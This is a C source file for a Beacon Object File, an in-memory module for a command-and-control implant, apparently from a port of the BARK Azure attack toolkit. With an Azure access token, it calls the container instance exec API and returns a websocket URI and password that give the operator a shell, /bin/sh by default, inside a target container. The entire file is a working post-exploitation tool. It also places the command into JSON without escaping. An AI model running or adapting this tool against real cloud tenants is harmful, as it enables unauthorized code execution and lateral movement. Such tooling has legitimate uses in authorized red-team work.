/*
 * get_azurerm_container_instance_info.c — BARK BOF
 * Get-AzureRMContainerInstanceInfo — Execute a command in a container instance
 *
 * Args : token, containerGroupPath, infoType, [containerName], [command]
 *
 * containerGroupPath : full ARM path, e.g.
 *   /subscriptions/<subId>/resourceGroups/<rg>/providers/Microsoft.ContainerInstance/containerGroups/<name>
 *
 * infoType : exec
 *   exec — POST exec endpoint; returns webSocketUri + password for the operator
 *          containerName is required; command defaults to /bin/sh
 *
 * Author : BARK BOF project
 * License: GPLv3
 */
#include <windows.h>
#include <winhttp.h>
#include "../../include/beacon.h"
#include "../../include/http_utils.h"

void go(char *args, int alen)
{
    datap  parser;
    static char pathBuf[2048];
    static char bodyBuf[512];
    LPWSTR widePath = NULL;
    char  *token              = NULL;
    char  *containerGroupPath = NULL;
    char  *infoType           = NULL;
    char  *containerName      = NULL;
    char  *command            = NULL;

    BeaconDataParse(&parser, args, alen);
    token              = BeaconDataExtract(&parser, NULL);
    containerGroupPath = BeaconDataExtract(&parser, NULL);
    infoType           = BeaconDataExtract(&parser, NULL);
    containerName      = BeaconDataExtract(&parser, NULL);
    command            = BeaconDataExtract(&parser, NULL);

    if (!token || MSVCRT$strlen(token) == 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Usage: bark_get_azurerm_container_instance_info <token> <containerGroupPath> exec <containerName> [command]\n");
        return;
    }
    containerGroupPath = SAFE_STR(containerGroupPath);
    infoType           = SAFE_STR(infoType);
    containerName      = SAFE_STR(containerName);
    command            = SAFE_STR(command);

    if (MSVCRT$strcmp(infoType, "exec") == 0) {
        if (MSVCRT$strlen(containerName) == 0) {
            BeaconPrintf(CALLBACK_ERROR, "[-] containerName required for exec\n");
            return;
        }
        if (MSVCRT$strlen(command) == 0)
            command = "/bin/sh";

        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] Get-AzureRMContainerInstanceInfo (exec): %s container=%s cmd=%s\n",
            containerGroupPath, containerName, command);

        MSVCRT$sprintf_s(bodyBuf, sizeof(bodyBuf),
            "{\"command\":\"%s\",\"terminalSize\":{\"rows\":24,\"cols\":80}}",
            command);
        MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf),
            "%s/containers/%s/exec?api-version=2023-05-01",
            containerGroupPath, containerName);
        widePath = MbsToWcs(pathBuf);
        if (!widePath) { BeaconPrintf(CALLBACK_ERROR, "[-] Path conversion failed\n"); return; }
        BarkPost(L"management.azure.com", widePath, L"POST", bodyBuf, token, "application/json");
    } else {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Unknown infoType '%s'. Supported: exec\n", infoType);
        return;
    }
    HFree(widePath);
}
